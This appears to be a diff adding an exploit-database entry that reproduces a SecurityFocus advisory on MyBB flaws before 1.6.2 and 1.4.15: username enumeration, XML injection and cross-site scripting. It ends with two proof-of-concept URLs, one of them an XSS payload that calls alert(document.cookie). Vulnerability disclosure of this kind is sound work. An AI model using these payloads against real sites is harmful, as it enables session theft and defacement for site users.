@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/47131/info
+
+MyBB is prone to multiple security vulnerabilities. These vulnerabilities include a username-enumeration weakness, an XML-injection vulnerability, and a cross-site scripting vulnerability.
+
+Exploiting these issues may allow attackers to discern valid usernames, which may aid them in brute-force password cracking or other attacks. Attacker-supplied XML and script code would run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user.
+
+Versions prior to 1.6.2 and 1.4.15 are vulnerable. 
+
+XML-injection:
+http://www.example.com/xmlhttp.php?action=username_exists&value=%3Cxml/%3E
+
+XSS:
+http://www.example.com/xmlhttp.php?action=username_exists&value=%3Cdiv%20xmlns=%22http://www.w3.org/1999/xhtml%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3C/div%3E 
